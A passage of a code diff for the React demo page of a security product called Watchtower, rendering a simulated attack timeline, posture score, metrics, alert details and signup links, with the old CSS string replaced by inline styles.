+                ▶ Start Simulation
+              </button>
+            )}
+            {running && (
+              <div style={{ display:'flex', alignItems:'center', gap:10 }}>
+                <div style={{ flex:1, height:4, background:'#141820', borderRadius:2, overflow:'hidden' }}>
+                  <div style={{ height:'100%', background:'linear-gradient(90deg,#4f8fff,#7c6aff)', borderRadius:2, width:`${progress}%`, transition:'width 0.2s' }} />
+                </div>
+                <span style={{ fontSize:'0.66rem', color:'#50607a', fontFamily:'JetBrains Mono,monospace', whiteSpace:'nowrap' }}>{progress.toFixed(0)}%</span>
+              </div>
+            )}
+            {!running && progress === 100 && (
+              <div style={{ display:'flex', gap:8, alignItems:'center' }}>
+                <div style={{ fontSize:'0.78rem', color:'#22c992', fontWeight:700 }}>✓ Simulation complete — threat contained in {scenario.duration}s</div>
+                <button onClick={() => { reset(); }} style={{ marginLeft:'auto', padding:'6px 14px', borderRadius:7, border:'1px solid #1e2536', background:'transparent', color:'#8a9ab8', fontSize:'0.74rem', cursor:'pointer', fontFamily:'Inter,sans-serif' }}>↺ Replay</button>
+              </div>
+            )}
+          </div>
+
+          {/* Timeline */}
+          <div style={{ display:'flex', flexDirection:'column', gap:0 }}>
+            {steps.length === 0 && (
+              <div style={{ textAlign:'center', padding:'50px 20px', color:'#50607a', fontSize:'0.82rem', lineHeight:1.6 }}>
+                <div style={{ fontSize:'2rem', marginBottom:8 }}>🛡</div>
+                Perimeter secure — press Play to watch an attack unfold and see how Watchtower responds
+              </div>
+            )}
+            {steps.map((step, i) => {
+              const isSel = selectedStep === step;
+              return (
+                <div key={i} className={i === steps.length-1 && running ? 'step-new' : ''}
+                  onClick={() => { setSelectedStep(isSel ? null : step); setActiveView('alert'); }}
+                  style={{ display:'flex', gap:0, cursor:'pointer', borderRadius:8, transition:'background .15s', background: isSel ? '#0d1220' : 'transparent' }}>
+                  <div style={{ display:'flex', flexDirection:'column', alignItems:'center', minWidth:54, position:'relative' }}>
+                    <span style={{ fontSize:'0.6rem', fontFamily:'JetBrains Mono,monospace', color:'#2a3a50', marginBottom:3, paddingTop:6 }}>T+{step.t.toFixed(1)}s</span>
+                    <div style={{ width:10,height:10,borderRadius:'50%',background:SEV_COLOR[step.sev],boxShadow:`0 0 8px ${SEV_COLOR[step.sev]}60`,zIndex:1,flexShrink:0 }} />
+                    {i < steps.length-1 && <div style={{ width:1, flex:1, background:'#141820', minHeight:20, marginTop:2 }} />}
+                  </div>
+                  <div style={{ flex:1, padding:'4px 10px 12px' }}>
+                    <div style={{ display:'flex', alignItems:'center', gap:6, marginBottom:2 }}>
+                      <span style={{ fontSize:'0.5rem', fontWeight:700, color:'#4a5568', textTransform:'uppercase', letterSpacing:'0.5px' }}>{step.phase}</span>
+                    </div>
+                    <div style={{ fontSize:'0.78rem', fontWeight:600, lineHeight:1.4, marginBottom:4 }}>{step.title}</div>
+                    <div style={{ display:'flex', gap:4, flexWrap:'wrap', alignItems:'center' }}>
+                      <span style={{ fontSize:'0.5rem', fontWeight:700, padding:'1px 6px', borderRadius:3, background:'#4f8fff12', color:'#4f8fff', border:'1px solid #4f8fff18' }}>{step.src}</span>
+                      <span style={{ fontSize:'0.5rem', fontWeight:700, color:'#7c6aff', fontFamily:'JetBrains Mono,monospace' }}>{step.mitre}</span>
+                      <span style={{ fontSize:'0.48rem', color:'#2a3a50', fontFamily:'JetBrains Mono,monospace' }}>{step.device}</span>
+                      <span style={{ marginLeft:'auto', fontSize:'0.52rem', fontWeight:800, color:VERDICT_COLOR[step.verdict].c, background:VERDICT_COLOR[step.verdict].bg, padding:'1px 6px', borderRadius:3, fontFamily:'JetBrains Mono,monospace' }}>{step.verdict} {step.conf}%</span>
+                    </div>
+                    <div style={{ fontSize:'0.68rem', color:'#22c992', marginTop:4 }}>⚡ {step.action}</div>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+
+          {/* Result Banner */}
+          {progress === 100 && (
+            <div style={{ padding:'16px 18px', background:'linear-gradient(145deg,#081410,#0a1512)', border:'1px solid #22c99228', borderRadius:12, marginTop:14 }}>
+              <div style={{ fontSize:'0.88rem', fontWeight:800, color:'#22c992', marginBottom:12 }}>🏆 Attack Contained — Full AI Response Summary</div>
+              <div style={{ display:'grid', gridTemplateColumns:'repeat(4,1fr)', gap:6, marginBottom:14 }}>
+                {[{val:steps.length,label:'Alerts Ingested',c:'#4f8fff'},{val:tpCount,label:'True Positives',c:'#f0405e'},{val:fpCount,label:'Auto-Closed FPs',c:'#22d49a'},{val:`${scenario.duration}s`,label:'Total Response',c:'#8b6fff'}].map(s => (
+                  <div key={s.label} style={{ textAlign:'center', padding:'10px 4px', background:'#050508', border:'1px solid #141820', borderRadius:8 }}>
+                    <div style={{ fontSize:'1.4rem', fontWeight:900, fontFamily:'JetBrains Mono,monospace', color:s.c, letterSpacing:-1 }}>{s.val}</div>
+                    <div style={{ fontSize:'0.47rem', color:'#50607a', fontWeight:700, textTransform:'uppercase', letterSpacing:'0.4px', marginTop:2 }}>{s.label}</div>
+                  </div>
+                ))}
+              </div>
+              {steps.filter(s => s.verdict === 'TP').slice(0,4).map(s => (
+                <div key={s.title} style={{ fontSize:'0.72rem', color:'#22c992', display:'flex', gap:8, padding:'3px 0', lineHeight:1.4 }}>
+                  <span style={{ flexShrink:0 }}>✓</span>
+                  <span><strong>{s.src}:</strong> {s.action}</span>
+                </div>
+              ))}
+            </div>
+          )}
+        </div>
+
+        {/* RIGHT PANEL */}
+        <div style={{ padding:'14px', display:'flex', flexDirection:'column', gap:8, overflow:'auto', background:'#07080f' }}>
+
+          {/* Posture */}
+          <div style={{ padding:'12px 14px', background:'#0a0d14', border:'1px solid #141820', borderRadius:12 }}>
+            <div style={{ fontSize:'0.72rem', fontWeight:800, marginBottom:8, color:'#6b7a94' }}>🛡 Security Posture</div>
+            <div style={{ display:'flex', alignItems:'center', gap:14 }}>
+              <div style={{ position:'relative', width:70, height:70, flexShrink:0 }}>
+                <svg viewBox='0 0 100 100' style={{ width:'100%', height:'100%' }}>
+                  <circle cx={50} cy={50} r={42} fill='none' stroke='#141820' strokeWidth={7} />
+                  <circle cx={50} cy={50} r={42} fill='none' stroke={scoreColor} strokeWidth={7} strokeDasharray={dashArray} strokeLinecap='round' transform='rotate(-90 50 50)' style={{ transition:'stroke-dasharray 0.8s ease,stroke 0.5s' }} />
+                </svg>
+                <div style={{ position:'absolute', top:'50%', left:'50%', transform:'translate(-50%,-62%)', fontSize:'1.4rem', fontWeight:900, fontFamily:'JetBrains Mono,monospace', color:scoreColor }}>{postureScore}</div>
+                <div style={{ position:'absolute', top:'50%', left:'50%', transform:'translate(-50%,45%)', fontSize:'0.65rem', fontWeight:800, color:scoreColor }}>{scoreGrade}</div>
+              </div>
+              <div>
+                <div style={{ fontSize:'0.78rem', color:'#8a9ab8', lineHeight:1.6 }}>
+                  {postureScore >= 75 ? 'Healthy posture' : postureScore >= 55 ? 'Under attack — degraded' : 'Critical — active incident'}<br />
+                  <span style={{ fontSize:'0.65rem', color:'#50607a' }}>Updated live as AI responds</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Live Metrics */}
+          <div style={{ padding:'12px 14px', background:'#0a0d14', border:'1px solid #141820', borderRadius:12 }}>
+            <div style={{ fontSize:'0.72rem', fontWeight:800, marginBottom:8, color:'#6b7a94' }}>📊 Live Metrics</div>
+            <div style={{ display:'grid', gridTemplateColumns:'repeat(2,1fr)', gap:4 }}>
+              {[{val:steps.length,label:'Alerts',c:'#4f8fff'},{val:steps.filter(s=>s.sev==='CRITICAL').length,label:'Critical',c:'#f0405e'},{val:tpCount,label:'TPs Escalated',c:'#f97316'},{val:fpCount,label:'FPs Closed',c:'#22d49a'}].map(s => (
+                <div key={s.label} style={{ textAlign:'center', padding:'7px 2px', background:'#050508', border:'1px solid #141820', borderRadius:6 }}>
+                  <div style={{ fontSize:'1.1rem', fontWeight:900, fontFamily:'JetBrains Mono,monospace', letterSpacing:-1, color:s.c }}>{s.val}</div>
+                  <div style={{ fontSize:'0.44rem', color:'#50607a', fontWeight:700, textTransform:'uppercase', letterSpacing:'0.4px' }}>{s.label}</div>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          {/* Tool Detection Status */}
+          <div style={{ padding:'12px 14px', background:'#0a0d14', border:'1px solid #141820', borderRadius:12 }}>
+            <div style={{ fontSize:'0.72rem', fontWeight:800, marginBottom:8, color:'#6b7a94' }}>🔌 Tool Detection Status</div>
+            <div style={{ display:'flex', flexDirection:'column', gap:3 }}>
+              {TOOLS_LIST.map(tool => {
+                const active = toolsActive.has(tool);
+                const count = steps.filter(s => s.src === tool).length;
+                return (
+                  <div key={tool} style={{ display:'flex', alignItems:'center', gap:8, fontSize:'0.7rem', color: active ? '#e6ecf8' : '#50607a', padding:'3px 0', transition:'color 0.3s' }}>
+                    <div style={{ width:6,height:6,borderRadius:'50%',background: active ? '#22c992' : '#252e42',boxShadow: active ? '0 0 6px #22c992' : 'none',flexShrink:0,transition:'all 0.3s' }} />
+                    <span style={{ flex:1 }}>{tool}</span>
+                    {count > 0 && <span style={{ fontSize:'0.58rem', fontFamily:'JetBrains Mono,monospace', color:'#4f8fff', fontWeight:700 }}>{count} alert{count > 1 ? 's' : ''}</span>}
+                  </div>
+                );
+              })}
+            </div>
+          </div>
+
+          {/* Alert Detail */}
+          {selectedStep && (
+            <div style={{ padding:'12px 14px', background:'#0a101e', border:'1px solid #4f8fff28', borderRadius:12 }}>
+              <div style={{ display:'flex', alignItems:'center', gap:6, marginBottom:8 }}>
+                <div className='sev-bar' style={{ height:16, background:SEV_COLOR[selectedStep.sev] }} />
+                <span style={{ fontSize:'0.52rem', fontWeight:800, color:SEV_COLOR[selectedStep.sev], textTransform:'uppercase' }}>{selectedStep.sev}</span>
+                <button onClick={() => setSelectedStep(null)} style={{ marginLeft:'auto', background:'none', border:'none', color:'#50607a', cursor:'pointer', fontSize:'0.9rem', lineHeight:1 }}>×</button>
+              </div>
+              <div style={{ fontSize:'0.8rem', fontWeight:700, lineHeight:1.4, marginBottom:8 }}>{selectedStep.title}</div>
+              <div style={{ fontSize:'0.74rem', fontWeight:800, padding:'5px 10px', borderRadius:6, background:'#050508', border:'1px solid #141820', marginBottom:10, color:VERDICT_COLOR[selectedStep.verdict].c, display:'inline-block' }}>
+                {selectedStep.verdict === 'TP' ? 'TRUE POSITIVE' : selectedStep.verdict === 'FP' ? 'FALSE POSITIVE' : 'SUSPICIOUS'} — {selectedStep.conf}%
+              </div>
+              <div style={{ fontSize:'0.6rem', fontWeight:700, color:'#50607a', textTransform:'uppercase', letterSpacing:'0.5px', marginBottom:4 }}>AI Analysis</div>
+              <div style={{ fontSize:'0.72rem', color:'#8a9ab8', lineHeight:1.65, marginBottom:10 }}>{selectedStep.aiNote}</div>
+              <div style={{ fontSize:'0.6rem', fontWeight:700, color:'#50607a', textTransform:'uppercase', letterSpacing:'0.5px', marginBottom:4 }}>Action Taken</div>
+              <div style={{ fontSize:'0.72rem', color:'#22c992', display:'flex', gap:6 }}>
+                <span>⚡</span><span>{selectedStep.action}</span>
+              </div>
+              <div style={{ display:'flex', gap:8, marginTop:10, paddingTop:10, borderTop:'1px solid #141820', flexWrap:'wrap' }}>
+                <span style={{ fontSize:'0.5rem', padding:'2px 8px', borderRadius:3, background:'#4f8fff12', color:'#4f8fff', border:'1px solid #4f8fff18', fontWeight:700 }}>{selectedStep.src}</span>
+                <span style={{ fontSize:'0.5rem', padding:'2px 8px', borderRadius:3, background:'#7c6aff12', color:'#7c6aff', fontWeight:700, fontFamily:'JetBrains Mono,monospace' }}>{selectedStep.mitre}</span>
+                <span style={{ fontSize:'0.5rem', padding:'2px 8px', borderRadius:3, background:'#141820', color:'#3a4a60', fontFamily:'JetBrains Mono,monospace' }}>{selectedStep.device}</span>
+              </div>
+            </div>
+          )}
+
+          {/* Explainer */}
+          {!selectedStep && (
+            <div style={{ padding:'12px 14px', background:'#0a0d14', border:'1px solid #141820', borderRadius:12 }}>
+              <div style={{ fontSize:'0.72rem', fontWeight:800, marginBottom:8, color:'#6b7a94' }}>💡 What you&apos;re seeing</div>
+              <div style={{ fontSize:'0.72rem', color:'#8a9ab8', lineHeight:1.75 }}>
+                This is what Watchtower does automatically, 24/7. Every alert is triaged by AI in &lt;3.2 seconds — with a confidence score, evidence chain, and automated response action.<br /><br />
+                Click any alert in the timeline to see the AI&apos;s full reasoning.
+              </div>
+            </div>
+          )}
+        </div>
+      </div>
+
+      {/* BOTTOM */}
+      <div style={{ display:'flex', alignItems:'center', justifyContent:'center', gap:16, padding:'14px 20px', borderTop:'1px solid #141820', background:'#080a12', flexWrap:'wrap' }}>
+        <strong style={{ fontSize:'0.82rem' }}>This is what Watchtower does automatically, 24/7.</strong>
+        <span style={{ fontSize:'0.78rem', color:'#8a9ab8' }}>Your analysts arrive to a clean queue — threats contained, noise eliminated.</span>
+        <a href='/signup' style={{ padding:'8px 20px', borderRadius:8, background:'#4f8fff', color:'#fff', fontSize:'0.8rem', fontWeight:700, textDecoration:'none', whiteSpace:'nowrap' }}>Start 14-Day Free Trial →</a>
+        <a href='/pricing' style={{ padding:'8px 18px', borderRadius:8, background:'transparent', color:'#8a9ab8', fontSize:'0.8rem', fontWeight:600, textDecoration:'none', border:'1px solid #252e42', whiteSpace:'nowrap' }}>View Pricing</a>
       </div>
     </div>
-
-    <div className="dm-bottom"><strong>This is what Watchtower does automatically, 24/7.</strong> Your analysts arrive to a clean queue — threats contained, noise eliminated.<a href="/signup" className="dm-cta">Start 14-Day Free Trial →</a><a href="/pricing" className="dm-cta-ghost">View Pricing</a></div>
-  </div></>);
+  );
 }
-
-const CSS = `@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600&display=swap');
-*{margin:0;padding:0;box-sizing:border-box}body{background:#050508;color:#e6ecf8;font-family:'Inter',sans-serif}
-.dm{min-height:100vh;display:flex;flex-direction:column}
-.dm-banner{text-align:center;padding:8px 16px;background:#3b8bff06;border-bottom:1px solid #3b8bff12;font-size:.74rem;color:#50607a}
-.dm-banner a{color:#3b8bff;font-weight:700;text-decoration:none;margin-left:6px}
-.dm-top{display:flex;align-items:center;padding:12px 20px;border-bottom:1px solid #141820;gap:12px}
-.dm-logo{display:flex;align-items:center;gap:6px;font-weight:900;font-size:.95rem;margin-right:auto}
-.dm-li{width:24px;height:24px;border-radius:6px;background:linear-gradient(135deg,#3b8bff,#7c6aff);display:flex;align-items:center;justify-content:center;font-size:.6rem;color:#fff;font-weight:900}
-.dm-logo span{color:#3b8bff}
-.dm-env{font-size:.58rem;font-weight:700;padding:3px 10px;border-radius:4px;background:#f0a03012;color:#f0a030;border:1px solid #f0a03020;letter-spacing:.5px}
-.dm-live{width:6px;height:6px;border-radius:50%;background:#22c992;box-shadow:0 0 6px #22c992;animation:pulse 2s ease infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
-.dm-cta{padding:7px 18px;border-radius:8px;background:#3b8bff;color:#fff;font-size:.78rem;font-weight:700;text-decoration:none;border:none;cursor:pointer;font-family:'Inter',sans-serif;white-space:nowrap;transition:all .15s}
-.dm-cta:hover{background:#2a7aef;transform:translateY(-1px)}
-.dm-cta-ghost{padding:7px 18px;border-radius:8px;background:transparent;color:#8a9ab8;font-size:.78rem;font-weight:600;text-decoration:none;border:1px solid #252e42;cursor:pointer;font-family:'Inter',sans-serif;white-space:nowrap}
-.dm-cols{display:grid;grid-template-columns:1fr 340px;gap:0;flex:1;overflow:hidden}
-.dm-left{padding:16px 20px;border-right:1px solid #141820;overflow-y:auto}
-.dm-right{padding:14px;display:flex;flex-direction:column;gap:8px;overflow-y:auto}
-.dm-scenario{padding:20px;background:linear-gradient(145deg,#0a0d14,#0f1219);border:1px solid #141820;border-radius:12px;margin-bottom:14px}
-.dm-scenario-hd{font-size:.88rem;font-weight:800;margin-bottom:6px}
-.dm-scenario p{font-size:.74rem;color:#8a9ab8;line-height:1.6;margin-bottom:12px}
-.dm-play{padding:10px 28px;border-radius:10px;background:linear-gradient(135deg,#3b8bff,#7c6aff);color:#fff;font-size:.85rem;font-weight:700;border:none;cursor:pointer;font-family:'Inter',sans-serif;box-shadow:0 4px 20px rgba(59,139,255,.25);transition:all .2s}
-.dm-play:hover{transform:translateY(-1px);box-shadow:0 6px 28px rgba(59,139,255,.35)}
-.dm-progress{display:flex;align-items:center;gap:10px}
-.dm-pbar{flex:1;height:4px;background:#141820;border-radius:2px;overflow:hidden}
-.dm-pbar div{height:100%;background:linear-gradient(90deg,#3b8bff,#7c6aff);border-radius:2px;transition:width .4s}
-.dm-progress span{font-size:.66rem;color:#50607a;font-family:'JetBrains Mono',monospace;white-space:nowrap}
-.dm-timeline{display:flex;flex-direction:column;gap:0}
-.dm-tl-item{display:flex;gap:0;padding:6px 0;cursor:pointer;transition:background .15s;animation:slideIn .35s ease}
-.dm-tl-item:hover,.dm-tl-item.selected{background:#0a0d14;border-radius:8px}
-.dm-tl-item.new{animation:slideIn .35s ease,flash .6s ease}
-@keyframes slideIn{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
-@keyframes flash{0%{background:#3b8bff10}100%{background:transparent}}
-.dm-tl-left{display:flex;flex-direction:column;align-items:center;min-width:50px;position:relative}
-.dm-tl-time{font-size:.62rem;font-family:'JetBrains Mono',monospace;color:#50607a;margin-bottom:4px}
-.dm-tl-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;z-index:1}
-.dm-tl-line{width:1px;flex:1;background:#141820;min-height:20px;margin-top:2px}
-.dm-tl-body{flex:1;padding:0 8px 10px}
-.dm-tl-phase-row{display:flex;align-items:center;gap:6px;margin-bottom:2px}
-.dm-tl-phase{font-size:.52rem;font-weight:700;color:#50607a;text-transform:uppercase;letter-spacing:.5px}
-.dm-tl-title{font-size:.76rem;font-weight:600;line-height:1.4}
-.dm-tl-meta{display:flex;gap:4px;margin-top:4px;flex-wrap:wrap;align-items:center}
-.dm-src{font-size:.5rem;font-weight:700;padding:1px 6px;border-radius:3px;background:#3b8bff10;color:#3b8bff;border:1px solid #3b8bff15}
-.dm-mitre{font-size:.5rem;font-weight:600;color:#7c6aff;font-family:'JetBrains Mono',monospace}
-.dm-device{font-size:.5rem;color:#50607a;font-family:'JetBrains Mono',monospace}
-.dm-verdict{font-size:.52rem;font-weight:800;margin-left:auto;font-family:'JetBrains Mono',monospace}
-.dm-tl-empty{text-align:center;padding:50px 20px;color:#50607a;font-size:.82rem;line-height:1.6}
-.dm-result{padding:18px;background:linear-gradient(145deg,#0a1a10,#0b1512);border:1px solid #22c99225;border-radius:12px;margin-top:14px}
-.dm-result-hd{font-size:.85rem;font-weight:800;margin-bottom:12px;color:#22c992}
-.dm-result-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:14px}
-.dm-result-item{text-align:center;padding:10px 4px;background:#050508;border-radius:8px;border:1px solid #141820}
-.dm-ri-val{font-size:1.2rem;font-weight:900;font-family:'JetBrains Mono',monospace;letter-spacing:-1px}
-.dm-ri-label{font-size:.48rem;color:#50607a;font-weight:600;text-transform:uppercase;letter-spacing:.3px;margin-top:2px}
-.dm-result-actions{display:flex;flex-direction:column;gap:5px}
-.dm-ra{font-size:.72rem;color:#22c992;display:flex;align-items:flex-start;gap:8px;line-height:1.4}
-.dm-ra-icon{font-size:.8rem;flex-shrink:0}
-.dm-card{background:linear-gradient(145deg,#0a0d14,#0f1219);border:1px solid #141820;border-radius:12px;padding:12px 14px}
-.dm-card-hd{font-size:.72rem;font-weight:800;margin-bottom:8px;display:flex;align-items:center;gap:6px}
-.dm-close{margin-left:auto;background:none;border:none;color:#50607a;cursor:pointer;font-size:.9rem;padding:0 4px}
-.dm-posture{display:flex;align-items:center;gap:12px}
-.dm-posture-ring{position:relative;width:70px;height:70px;flex-shrink:0}
-.dm-posture-ring svg{width:100%;height:100%}
-.dm-posture-val{position:absolute;top:50%;left:50%;transform:translate(-50%,-60%);font-size:1.3rem;font-weight:900;font-family:'JetBrains Mono',monospace}
-.dm-posture-grade{position:absolute;top:50%;left:50%;transform:translate(-50%,50%);font-size:.6rem;font-weight:800}
-.dm-posture-label{font-size:.72rem;color:#8a9ab8;line-height:1.4}
-.dm-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:4px}
-.dm-stat{text-align:center;padding:6px 2px;background:#050508;border-radius:6px;border:1px solid #141820}
-.dm-stat-v{font-size:1rem;font-weight:900;font-family:'JetBrains Mono',monospace;letter-spacing:-1px}
-.dm-stat-l{font-size:.42rem;color:#50607a;font-weight:600;text-transform:uppercase;letter-spacing:.3px}
-.dm-tools-list{display:flex;flex-direction:column;gap:2px}
-.dm-tool-item{display:flex;align-items:center;gap:8px;font-size:.7rem;color:#50607a;padding:3px 0;transition:color .3s}
-.dm-tool-item.active{color:#e6ecf8}
-.dm-tool-dot{width:5px;height:5px;border-radius:50%;background:#252e42;flex-shrink:0;transition:all .3s}
-.dm-tool-dot.on{background:#22c992;box-shadow:0 0 6px #22c992}
-.dm-tool-count{margin-left:auto;font-size:.58rem;font-family:'JetBrains Mono',monospace;color:#3b8bff;font-weight:600}
-.dm-detail{border-color:#3b8bff25}
-.dm-detail-sev{display:flex;gap:6px;align-items:center;margin-bottom:6px}
-.dm-detail-sev-badge{font-size:.52rem;font-weight:800;padding:2px 8px;border-radius:4px;color:#fff;text-transform:uppercase}
-.dm-detail-title{font-size:.82rem;font-weight:700;margin-bottom:8px;line-height:1.4}
-.dm-verdict-big{font-size:.76rem;font-weight:800;margin-bottom:8px;padding:6px 10px;border-radius:6px;background:#050508;border:1px solid #141820}
-.dm-detail-analysis{font-size:.72rem;color:#8a9ab8;line-height:1.65;margin-bottom:10px}
-.dm-detail-section{font-size:.6rem;font-weight:700;color:#50607a;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px;margin-top:6px}
-.dm-detail-evidence{display:flex;flex-direction:column;gap:2px;margin-bottom:8px}
-.dm-ev-item{font-size:.68rem;color:#e6ecf8;padding:3px 0;padding-left:12px;position:relative}
-.dm-ev-item::before{content:'';position:absolute;left:0;top:9px;width:5px;height:5px;border-radius:50%;background:#3b8bff}
-.dm-detail-actions{display:flex;flex-direction:column;gap:2px;margin-bottom:10px}
-.dm-act-item{font-size:.68rem;color:#8a9ab8;display:flex;align-items:flex-start;gap:6px;padding:2px 0}
-.dm-act-num{font-size:.55rem;font-weight:800;color:#3b8bff;background:#3b8bff15;border-radius:3px;padding:1px 5px;flex-shrink:0;font-family:'JetBrains Mono',monospace}
-.dm-detail-pending{font-size:.74rem;color:#50607a;padding:12px 0;text-align:center;font-style:italic}
-.dm-detail-cta{padding-top:10px;border-top:1px solid #141820}
-.dm-explainer{font-size:.74rem;color:#8a9ab8;line-height:1.7}
-.dm-bottom{display:flex;align-items:center;justify-content:center;gap:14px;padding:16px;border-top:1px solid #141820;background:#0a0d14;flex-wrap:wrap;text-align:center;font-size:.8rem;color:#8a9ab8}
-.dm-bottom strong{color:#e6ecf8}
-@media(max-width:768px){.dm-cols{grid-template-columns:1fr}.dm-right{border-top:1px solid #141820}.dm-result-grid{grid-template-columns:repeat(2,1fr)}.dm-stats{grid-template-columns:repeat(2,1fr)}}`;
